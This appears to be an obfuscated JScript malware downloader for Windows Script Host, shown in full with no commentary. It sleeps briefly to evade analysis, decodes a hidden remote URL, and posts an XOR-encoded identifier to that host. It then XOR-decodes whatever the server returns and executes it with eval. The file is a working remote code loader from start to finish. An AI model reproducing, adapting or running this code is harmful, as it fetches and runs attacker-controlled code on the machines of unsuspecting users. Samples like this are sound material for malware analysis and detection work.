var uvpygxakga = robytqyr();
var dkucux2 = hupirubdvo(uvpygxakga);
while (uvpygxakga < dkucux2) {
	uvpygxakga = robytqyr();
	this['WScript']['Sleep'](1000);
}

function hupirubdvo(upstecohwlo) {
	return upstecohwlo + 10000;
}

function robytqyr() {
	var hlyasly4 = new Date();
	return soexckyto9(hlyasly4);
}

function soexckyto9(qipoqci) {
	return qipoqci['getTime']();
}


function sendRequest(jqojgy, qugcmyfik) {

	if(typeof qugcmyfik === 'undefined') { qugcmyfik = false; }

	var zanamgu = '', padwe = '', kvetyyp, foverjilut='eval';

	for (var hoib = 0; hoib < jqojgy['length']; hoib++) {
		zanamgu += hoib + '=' + encodeURIComponent(''+jqojgy[hoib]) + '&';
	}
	zanamgu = vordiym(zanamgu);

	try {
		var sozdaexfhu;
		sozdaexfhu = new ActiveXObject('MSXML2.XMLHTTP');
		sozdaexfhu['open']('POST', qeyq, false);
		sozdaexfhu['send'](zanamgu);
		if (sozdaexfhu['status'] == 200) {
			padwe = sozdaexfhu['responseText'];
			if(padwe) {
				kvetyyp = lvytbe(padwe);
				if(qugcmyfik) {
					return kvetyyp;
				}
				else {
					this[foverjilut](kvetyyp);
				}
			}
		}
		
	} catch (e) {}

	return false;
	
}

var qeyq = ytanofhxu('vfdiigb.i1wxi1e/imbobcs.kykeerbbzkxrgaomq.gnwicgxoplc.n1j5gbh2sdw4t9u4h/b/a:oswpxtutihs');
var tid =  ytanofhxu('r0e0i5k');
var wbz = ytanofhxu('k8f7v1z0edbbwfqai');

var jqojgy = chybbodyv();

function chybbodyv() {
	return ['a', tid];
}





sendRequest(jqojgy);


function mmeidmes(hoib) {
	var yvhhoxeog6 = '00'+hoib['toString'](16);
	yvhhoxeog6 = yvhhoxeog6['substr'](yvhhoxeog6['length']-2);
	return yvhhoxeog6;
}

function lvytbe(joorszipwe8) {
	var coax, dajpeuk, hoib, padwe = '';

	dajpeuk = parseInt(joorszipwe8['substr'](0, 2), 16);
	coax = joorszipwe8['substr'](2);
	
	for (hoib = 0; hoib < coax['length']; hoib+=2) {
		padwe += String['fromCharCode'](rexvo(parseInt(coax['substr'](hoib, 2), 16), dajpeuk));
	}
	
		
	return padwe;
}


function vordiym(joorszipwe8) {
	var dajpeuk = 214, hoib, padwe = '';
	
	for (hoib = 0; hoib < joorszipwe8['length']; hoib++) {
		padwe += mmeidmes(joorszipwe8['charCodeAt'](hoib) ^ dajpeuk);
	}

	return (mmeidmes(dajpeuk)+padwe);
}



function rexvo(tmyanomyr, epsik) {	
	return tmyanomyr ^ epsik;
}


function ytanofhxu(bixqbo) {
	bixqbo = bixqbo.split('');
	var fagon = '';
	for(var vaqywzmomdo=0; vaqywzmomdo<bixqbo['length']; vaqywzmomdo++) {
		if(vaqywzmomdo%2===1) fagon += bixqbo[vaqywzmomdo];
	}
	fagon = khonepydbke0(fagon);
	return fagon;
}

function khonepydbke0(ojtyb) {
	ojtyb = wokhoh6(ojtyb);
	var gsumololo = '';
	for (var gfubfeqco = ojtyb['length'] - 1; gfubfeqco >= 0; gfubfeqco--) {
		gsumololo += ojtyb[gfubfeqco];
	}
	return gsumololo;
}

function wokhoh6(henak) {
	return henak.split('');
}

